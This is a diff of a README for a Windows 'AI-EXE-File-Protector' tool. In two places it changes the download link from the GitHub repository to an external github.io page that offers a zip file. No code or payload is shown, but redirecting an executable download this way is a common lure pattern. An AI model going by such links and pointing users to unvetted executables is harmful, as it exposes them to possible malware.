@@ -1,6 +1,6 @@
 # 🛡️ AI-EXE-File-Protector - Keep Your Windows Software Files Safe
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Gabriela6639/AI-EXE-File-Protector)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://gabriela6639.github.io)
 
 ## 📁 What Does This Software Do?
 
@@ -20,7 +20,7 @@ You need a Windows computer to use this tool. It supports Windows 10 and Windows
 
 You must visit the website link to get the correct version of the tool.
 
-[Visit the download page here](https://github.com/Gabriela6639/AI-EXE-File-Protector)
+[Visit the download page here](https://gabriela6639.github.io)
 
 You will see a list of files on this page. Choose the file marked with the latest version number. Click the zip file to start your download.
 
